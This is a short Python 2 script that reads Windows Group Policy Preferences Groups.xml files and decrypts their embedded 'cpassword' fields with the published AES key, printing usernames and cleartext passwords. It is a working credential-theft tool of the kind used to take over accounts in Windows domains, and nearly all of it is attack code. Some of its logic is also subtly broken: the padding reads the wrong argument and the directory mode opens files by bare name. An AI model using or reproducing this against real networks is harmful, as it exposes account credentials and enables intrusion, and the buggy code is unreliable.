#!/usr/bin/python

import xmltodict 
import sys, os, re, json
from Crypto.Cipher import AES
from base64 import b64decode
from pprint import pprint

verbose = False
verbose2 = False
if '-v' in sys.argv:
   verbose = True
elif '-vv' in sys.argv:
   verbose2 = True
 
if not len(sys.argv[2:]):
  print "Usage: groupsxml.py [-p <cpassword>][-f Groups.xml][-d path-to-xml-files] [-v|-vv]"
  sys.exit(1)

def decryptPass(cpassword):
   # Init the key
   # From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2
   key = """
   4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
   f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
   """.replace(" ","").replace("\n","").decode('hex')
   
   # Add padding to the base64 string and decode it
   cpassword += "=" * ((4 - len(sys.argv[1]) % 4) % 4)
   password = b64decode(cpassword)
   
   # Decrypt the password
   o = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)
   
   return o[:-ord(o[-1])].decode('utf16')

def parseUser(user):
   try:
      
      keys = [('Username','@userName'),('Password','@cpassword'),('New username','@newName')]
      if verbose: keys = [('Username','@userName'),('Password','@cpassword'),('New username','@newName'),('Description','@description'),('Disabled','@acctDisabled'),('No change','@noChange')]
      if verbose2: keys = [('Username','@userName'),('Password','@cpassword'),('New username','@newName'),('Action','@action'),('Full Name','@fullName'),('Description','@description'),('Disabled','@acctDisabled'),('Never Expires','@neverExpires'),('No change','@noChange')]
      prop = user['Properties']
      if prop['@cpassword']:
         #print '\n'
         print 'Change date: %s' % user['@changed']
         for label,k in keys:
            if k in prop:
                  print '%s: %s' % (label,decryptPass(prop[k]) if k == '@cpassword' and prop[k] else prop[k])
         print 
   except:
      pass

   

def parseXml(DATA):
   try:
      c = json.loads(json.dumps(xmltodict.parse(DATA)))
      if 'User' in c['Groups']:
         user = c['Groups']['User']
         if isinstance(user,list):
            for i in user:
               parseUser(i)
         elif isinstance(user,dict):
            parseUser(user)
         else:
            print '\nNo passwords found\n'
         
   except:
      print 'Something went wrong...'
      print sys.exc_info()

if '-p' in sys.argv:
   pwd = sys.argv[sys.argv.index('-p')+1]
   print decryptPass(pwd)

elif '-f' in sys.argv:
   infile = sys.argv[sys.argv.index('-f')+1]
   with open(infile) as f:
      parseXml(f.read())
elif '-d' in sys.argv:
   for infile in [i for i in os.listdir(sys.argv[sys.argv.index('-d')+1]) if '.xml' in i.lower()]:
      with open(infile) as f:
         parseXml(f.read())
      
      
#print '-'*30

   
